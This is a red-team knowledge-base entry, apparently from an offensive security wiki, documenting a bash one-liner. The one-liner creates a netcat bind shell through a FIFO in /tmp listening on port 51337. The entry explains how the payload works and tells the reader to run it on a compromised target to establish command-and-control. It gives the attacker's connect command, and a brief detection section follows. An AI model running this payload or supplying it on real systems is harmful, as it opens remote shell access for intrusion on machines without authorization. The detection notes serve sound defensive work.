---
id: 31041d93-ef84-472d-a382-9647e04e3b87
name: Bash-Netcat-Bind-Shell-Using-FIFO
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:08.876922+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - bind-shell
  - netcat
  - payload
validated: true
---

# Bash-Netcat-Bind-Shell-Using-FIFO

## Code

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

## Description

This bash one-liner creates a bind shell using Netcat OpenBSD by setting up a named FIFO pipe (/tmp/f) to redirect input/output between an interactive bash shell and a Netcat listener on port 51337. It removes any existing FIFO, creates a new one, pipes cat from the FIFO to bash (with full I/O redirection), and has Netcat listen verbosely on the port, piping received data back to the FIFO. When an attacker connects, the shell becomes interactive, allowing remote command execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 51337 | Listening port (hardcoded; change if needed to avoid conflicts) | 4444 |

No other variables; the FIFO path (/tmp/f) is fixed but can be customized for stealth.

## Usage

Execute this code directly on the target machine after gaining initial command execution (e.g., via RCE or compromised credentials). It requires write access to /tmp and permission to bind the port (ports >1024 don't need root). Ideal for post-exploitation in red team engagements to establish C2. Connect from attacker side using Netcat: `nc -nv <target-ip> 51337`. Used in procedure [[procedures/Create-Bind-Shell-with-Netcat-OpenBSD]].

## Detection

- Monitor for Netcat processes listening on unusual ports: `ps aux | grep nc` or `lsof -i :51337`.
- File system changes: Creation of FIFOs in /tmp via `inotifywait` or audit logs.
- Network indicators: Inbound connections to high ports; use IDS rules for nc traffic.
- Process tree: Bash spawned from nc with pipe redirections.

## Related

- [[procedures/Create-Bind-Shell-with-Netcat-OpenBSD]]
- [[tools/Netcat-OpenBSD]]
